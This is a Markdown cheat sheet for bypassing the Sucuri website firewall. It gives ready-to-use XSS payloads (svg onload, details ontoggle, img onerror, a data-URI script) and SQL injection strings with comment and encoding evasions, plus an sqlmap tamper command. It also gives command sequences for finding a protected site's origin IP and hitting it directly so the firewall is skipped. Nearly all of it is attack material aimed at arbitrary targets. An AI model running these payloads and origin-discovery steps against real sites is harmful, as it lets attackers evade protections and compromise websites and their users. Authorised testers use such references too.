# Sucuri

### Detection Signals
| Signal | Where |
|--------|-------|
| `x-sucuri-id` header | Response header |
| `x-sucuri-cache` header | Cache status |
| `server: Sucuri/Cloudproxy` | Server header |
| Block page: "Access Denied - Sucuri Website Firewall" | 403 response body |
| `sucuri_cloudproxy_uuid_*` cookie | Session cookie |

### Bypass Strategy
- **Recommended tool**: curl/Burp after finding origin IP (Sucuri is cloud proxy, bypass = hit origin directly)
- **Primary bypass**: Find origin IP. Sucuri is a DNS-level proxy. If you find the origin, WAF is completely bypassed.
- **Secondary**: Sucuri rules are less sophisticated than Akamai/Cloudflare for advanced payloads.

### XSS Bypass
```
# Sucuri blocks: basic XSS, script tags, common event handlers
# Bypasses (often simpler than enterprise WAFs):

<svg/onload=alert(1)>
<details/open/ontoggle=alert(1)>
<img src=x onerror=alert(1)>  (sometimes passes with encoding)
<math><mi//xlink:href="data:x,<script>alert(1)</script>">

# If origin IP found, WAF is bypassed entirely — use any payload
```

### SQLi Bypass
```
sqlmap --tamper=between,space2comment -u URL

# Sucuri bypasses:
' /*!UNION*/ /*!SELECT*/ 1,2,3--
' %55nion %53elect 1,2,3--
```

### Rate Limiting
- Moderate. Blocks after sustained automated scanning (~50-100 rapid requests).
- Block page with support ID.
- Recovery: Usually auto-unblocks after 15-30 minutes.

### Origin IP Discovery
```bash
# Sucuri is DNS proxy — origin IP is the #1 bypass target

# DNS history (pre-Sucuri IP):
curl -s "https://api.securitytrails.com/v1/domain/TARGET/history/dns/a" -H "apikey: KEY"

# Shodan/Censys for origin:
uncover -q "ssl.cert.subject.CN:TARGET" -e shodan,censys

# Check subdomains not behind Sucuri:
subfinder -d TARGET -silent | httpx -sc | grep -v "sucuri"

# Mail server (MX) often resolves to origin:
dnsx -d TARGET -resp -mx
dig TARGET MX +short

# PHP info / debug pages may leak SERVER_ADDR
curl -s https://TARGET/phpinfo.php | grep "SERVER_ADDR"

# Direct connection test once origin found:
curl -sI https://ORIGIN_IP -H "Host: TARGET" --resolve "TARGET:443:ORIGIN_IP"
```

---

